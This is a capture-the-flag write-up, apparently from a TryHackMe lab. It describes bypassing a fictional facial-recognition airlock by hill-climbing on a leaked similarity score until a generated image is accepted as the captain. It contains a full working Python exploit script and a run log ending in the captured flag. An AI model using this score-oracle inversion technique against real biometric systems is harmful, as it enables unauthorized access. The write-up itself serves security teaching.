## Mask of Injectus IX Writeup

**Category:** Adversarial Machine Learning / Embedding Inversion 
**Objective:** Bypass a biometric facial recognition airlock restricted to Captain Vex Morrigan. **Constraint:** The target's portrait is entirely withheld. No source image is available to manipulate.

##### **Vulnerability Analysis**
The authentication API (`/api/auth`) contained a critical information disclosure vulnerability. Instead of returning a secure, binary `["GRANTED", "DENIED"]` response, the API leaked the exact continuous confidence score (`"similarity": 0.371`) calculated by its internal facial recognition embedding model.

In Adversarial Machine Learning, a leaked confidence score acts as a perfect mathematical oracle. It transforms a secure biometric system into a **Black-Box Optimization** puzzle. By analyzing the directional change in this score, an attacker can use a **Hill Climbing algorithm** to mathematically reverse-engineer an image that satisfies the model's 512-dimensional embedding for the target identity, completely bypassing the need for a stolen credential (the face).


## Methodology & Attack Path

### Phase 1: Reconnaissance and The Oracle
Initial testing of the multipart form upload revealed the JSON response structure. 
**Request:**
```
POST /api/auth HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
```
**Response:**
```
{"decision":"DENIED","ok":false,"similarity":0.371,"threshold":0.65}
```

The threshold for Captain-grade clearance was identified as `0.65`.

### Phase 2: Algorithm Design (Hill Climbing)

To exploit the oracle, a greedy optimization algorithm (Hill Climbing) was developed in Python. The core logic:

1. **Seed:** Start with a base image array.
2. **Mutate:** Apply a random noise matrix (Gaussian perturbation) to the pixels.
3. **Evaluate:** Submit to the API and parse the `similarity` score.
4. **Select:** If the score increases, keep the mutated image as the new baseline. If it decreases, discard the mutation.

### Phase 3: Bypassing the Local Maxima (The "Wrong Hill")

The initial implementation revealed that the 512-dimensional space contained multiple "gravity wells" corresponding to other registered crew members. The algorithm successfully reached the `0.65` threshold, but the airlock identified the generated image as a lower-ranking crew member (e.g., Asa Delarue), denying the flag.

**Solution:** The script was updated to parse the full JSON response. If the returned identity was not "Captain", the script recognized it had climbed a local maximum (the wrong hill).

### Phase 4: Evading the Two-Stage Detection Pipeline

Attempts to spawn at random coordinates using pure TV static (`np.random.randint(0, 256)`) failed. The API utilized a two-stage pipeline:

1. **Face Detector:** Validates the presence of a face
2. **Embedder:** Calculates the similarity score.
Pure static caused the Face Detector to throw an error, returning a hard `0.0000` score and blinding the algorithm. Attempting to trick the detector with noisy gray squares (`np.full` + heavy variance) allowed the script to bypass the detector but proved computationally slow.

### Phase 5: The "Seed Image" Strategy and Plateau Grinding
To bypass the detector flawlessly and provide a strong structural baseline, a random, high-quality stock photo of a human face (`attempt.png`) was used as the seed.

Because the AI strongly identified this seed as a distinct, non-target identity, the initial score was `0.0000`. The algorithm had to mutate the image to aggressively destroy the original identity before it could lock onto the Captain's gradient.

This resulted in severe "plateaus" where the script would evaluate hundreds of mutations without finding an improvement, especially as it approached the target threshold (e.g., spending 800+ iterations stuck at `0.6213`). A dynamic step-sizing approach was required, utilizing fine-grained pixel mutations (`mutation_rate = 5`) to carefully carve the final mathematical vector without destroying the established progress.

## The Final Exploit Script

Below is the Python script utilized to successfully breach the airlock via the seed image strategy.
*Code written using AI*
```python
import requests
import numpy as np
from PIL import Image
import io
import sys
import time

URL = "http://TARGET_IP/api/auth" #replace this
IMAGE_SIZE = (128, 128) 

# Persistent session to prevent ConnectionResetError(104) under heavy load
session = requests.Session()

def evaluate_image(img_array, retries=3):
    """Converts array to PNG in memory, submits to API, handles retries."""
    img = Image.fromarray(img_array.astype(np.uint8), 'RGB')
    byte_io = io.BytesIO()
    img.save(byte_io, format='PNG')
    byte_io.seek(0)
    
    for attempt in range(retries):
        files = {'photo': ('your_image.png', byte_io.getvalue(), 'image/png')} #replace with your image name here
        try:
            response = session.post(URL, files=files, timeout=5)
            return response.json() 
        except requests.exceptions.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5) 
                continue
            return None
        except ValueError:
            return None

def main():
    print("[*] Starting Biometric Inversion...")
    
    try:
        seed_img = Image.open("attempt.png").convert('RGB').resize(IMAGE_SIZE)
        best_image = np.array(seed_img, dtype=np.float64)
    except Exception as e:
        print(f"[!] Error loading seed image: {e}")
        sys.exit(1)

    initial_test = evaluate_image(best_image)
    best_score = float(initial_test.get('similarity', 0.0))
    print(f"[*] Initial Baseline Score: {best_score:.4f}")

    iteration = 0
    stuck_counter = 0 
    successful_noise = np.zeros((128, 128, 3)) 

    while True:
        iteration += 1
        mutation_rate = 5 
        
        # Introduce random noise, retaining partial momentum from successful previous iterations
        fresh_noise = np.random.randn(128, 128, 3) * mutation_rate
        combined_noise = (fresh_noise * 0.7) + (successful_noise * 0.3)
        
        mutated_image = np.clip(best_image + combined_noise, 0.0, 255.0)
        data = evaluate_image(mutated_image)
        time.sleep(0.05) # Rate limiting to prevent Gunicorn thread exhaustion
        
        if not data:
            continue 
            
        current_score = float(data.get('similarity', 0.0))
        
        # Win Condition
        if data.get('ok') == True or data.get('decision') == 'AUTHORIZED':
            print(f"\n[!] SUCCESS! Airlock bypassed!")
            print(f"[!] Flag: {data.get('fleet_directive')}")
            sys.exit(0)

        # Optimization Logic
        if current_score > best_score:
            improvement = current_score - best_score
            best_score = current_score
            best_image = mutated_image
            stuck_counter = 0 
            successful_noise = combined_noise 
            print(f"[+] Iter {iteration:04d} | Score: {best_score:.4f} (+{improvement:.4f})")
        else:
            stuck_counter += 1 

        if stuck_counter % 50 == 0 and stuck_counter > 0:
            print(f"[-] Stuck for {stuck_counter} iterations. Current best remains: {best_score:.4f}")

if __name__ == "__main__":
    main()
```

## Results & Remediation

After over 4,500 continuous optimization cycles, the script successfully manipulated the source image's pixel matrix to output a 512-dimensional embedding that passed the `0.65` threshold for Captain Vex Morrigan.

**Flag Captured:** `THM{m4sk_0f_1nj3ctus_b1m3tr1c_inv3rs10n}`

```bash
┌──(kali㉿DESKTOP-0CQIE5S)-[~]
└─$ python3 embedding.py
[*] Starting Embedding Inversion (Custom Seed Image Mode)...
[*] Loading attempt.jpg...
[*] Connection successful!
[*] Initial Baseline Score for attempt.jpg: 0.0000
[-] Stuck for 50 iterations. Current best remains: 0.0000
[-] Stuck for 100 iterations. Current best remains: 0.0000
[+] Iter 0139 | Score: 0.3749 (+0.3749)
[+] Iter 0142 | Score: 0.4173 (+0.0424)
[+] Iter 0147 | Score: 0.4359 (+0.0186)
[+] Iter 0148 | Score: 0.4692 (+0.0333)
[+] Iter 0149 | Score: 0.4770 (+0.0078)
[+] Iter 0157 | Score: 0.4858 (+0.0088)
[+] Iter 0164 | Score: 0.4902 (+0.0044)
[-] Stuck for 50 iterations. Current best remains: 0.4902
[-] Stuck for 100 iterations. Current best remains: 0.4902
[-] Stuck for 150 iterations. Current best remains: 0.4902
# TRUNCATED FOR BREVITY
[-] Stuck for 700 iterations. Current best remains: 0.6388
[-] Stuck for 750 iterations. Current best remains: 0.6388
[-] Stuck for 800 iterations. Current best remains: 0.6388
[+] Iter 4415 | Score: 0.6429 (+0.0041)
[-] Stuck for 50 iterations. Current best remains: 0.6429
[-] Stuck for 100 iterations. Current best remains: 0.6429
[-] Stuck for 150 iterations. Current best remains: 0.6429
[+] Iter 4598 | Score: 0.6448 (+0.0019)
[-] Stuck for 50 iterations. Current best remains: 0.6448
[-] Stuck for 100 iterations. Current best remains: 0.6448
[-] Stuck for 150 iterations. Current best remains: 0.6448
[-] Stuck for 200 iterations. Current best remains: 0.6448
[-] Stuck for 250 iterations. Current best remains: 0.6448

[!] SUCCESS! Airlock bypassed!
[!] Response: {'clearance': 'CAPTAIN', 'decision': 'AUTHORIZED', 'fleet_directive': 'THM{m4sk_0f_1nj3ctus_b1m3tr1c_inv3rs10n}', 'ok': True, 'similarity': 0.6502, 'threshold': 0.65, 'user': {'id': 'v.morrigan', 'name': 'Vex Morrigan', 'rank': 'Captain (CO)'}}
```